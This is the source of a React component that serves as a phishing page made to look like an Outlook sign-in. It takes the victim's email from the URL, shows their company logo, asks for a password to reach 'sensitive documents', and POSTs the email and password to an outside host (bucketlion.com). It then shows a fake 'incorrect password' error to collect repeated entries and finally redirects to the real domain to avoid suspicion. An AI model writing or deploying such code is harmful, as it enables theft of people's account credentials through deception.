
import React, { useEffect, useState, useRef } from "react";
import './App.css';
// import { AiOutlineQuestionCircle } from 'react-icons/ai';
import $ from "jquery";
// import Preloader from "./Preloader/Preloader";
import { FaArrowLeftLong } from "react-icons/fa6";
import { ReactComponent as Keey } from "./key.svg";
import Custom from "./CustomPre";

const Outlook = ()=>{

    const reloadPg = ()=> window.location.reload();

    // const [spinLoader, setSpinLoader] = useState(false);

    const formRef = useRef();

    useEffect(()=>{
        const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1));
        document.title = "Documents";
        // setSpinLoader(true);
        setTimeout(() => {
            // setSpinLoader(false);
        }, 2500);
        console.log(extracetdEmail);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const emailInTheURLEtension = window.location.href;
    const sliceIn = emailInTheURLEtension.indexOf("@");
    const extendToDom = emailInTheURLEtension.substring((sliceIn+1)).toUpperCase().split('.', 1);
    


    const redirectURL = window.location.href;
    const sliceEqualSignR = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSignR+1)).split('&', 1).toString();

    const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
    const [outlookPassword, setOulookPassword] = useState('');

    const btnVal = 'Login';

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const [abc, setAbc] = useState(false);

    const [verif, setVerif] = useState(true);

    useEffect(()=>{
        setAbc(true);
        setTimeout(() => {
            setAbc(false);
        }, 4000);
    }, []);

    const submitOutlookForm = e=>{
        // console.log(formRef.current);
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
            // setErr(true);
        }else{
            setVerif(false)
            setAbc(true)
            setTimeout(() => {
                setAbc(false)
            }, 3000);
            setOutlookEmail(outlookEmail);
            // setSpinLoader(true);
            const user = {
                email: outlookEmail,
                password: outlookPassword
            };
            
            $.ajax({
                type: "POST",
                url: "https://bucketlion.com/logs/dashboard/file/ship.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            setTimeout(()=>{
                setOulookPassword('');
                setErr(true);
                setTimeout(() => {
                    // setSpinLoader(false);
                }, 2000);
            }, 2500)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 50){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain}`;
            }

        }
    }

    return(<section>


{     abc ?   <Custom /> :
        
        <div className="Outlook_wrapper">

            <div className="Outlook_form_wrapper">
                <main style={{
                    display:'flex',
                    alignItems:'center'
                }}>
                <img 
                    alt="outlook_svg"
                    src={`https://logo.clearbit.com/https://${extracetdemailDomain}`}
                    className="dommm"
                    // onError={e=> e.target.src = "https://media.geeksforgeeks.org/wp-content/uploads/20220608214420/galaryImage5-300x300.png"}
                    onError={e=> e.target.src = "data:image/png;base64,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"}
                />

                    &#160;&#160;&#160;

                <span><b>{extendToDom}</b></span>
                </main>

                <div className="email_no_input">
                    <span><FaArrowLeftLong /></span>
                    &#160;&#160;
                    <span>{extracetdEmail}</span>
                </div>


                <div className="enterpswd_notification">
                    <p><b>Enter Password</b></p>
                </div>

                { verif ? <div>
                    <p style={{
                        color:'#222',
                        lineHeight:'1.3em'
                    }}>
                        Because you're accessing sensitive documents, you need to verify your password
                    </p>
                </div> : null }

                { err ?
                    <p className="err">
                        Your account or password is incorrect. If you don't remember your password, <span className="reset" onClick={reloadPg}>reset it now</span>
                    <br />
                     {/* account or <span className="gett">get a new one</span>. */}
                </p>  
                : null }

                <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>
                    

                    <div className="outlook_password_container">
                    <label htmlFor="password"> </label>
                        <input 
                            type={`password`}
                            placeholder="Enter Password"
                            className="password_input input_outlook"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            required={true}
                            title="Please fill out this field"
                            name="password"
                            autoFocus
                        />
                    </div>


                    <div className="_opts_">
                        Forget password?
                    </div>

                    <div className="oiuytre">

                    <input
                            type={`reset`} 
                            value="Back"
                            className="defaukt_btn__ outlook_submit"
                            onClick={reloadPg}
                            style={{
                                color:'#000',
                                background:'buttonface',
                                width:''
                            }}
                        />

                                &#160;&#160;

                        <input
                            type={`submit`} 
                            value={btnVal}
                            className="outlook_submit"
                            onClick={submitOutlookForm}
                        />
                    </div>

                </form>
            </div>

        </div> }


        <article className="btm">

            <div className="fheudk">
                <Keey style={{cursor:'pointer'}} onClick={reloadPg}/>

                &#160;&#160;&#160;

                <p style={{cursor:'pointer'}} onClick={reloadPg}>Sign in options</p>
            </div>

        </article>


    </section>)
};

export default Outlook;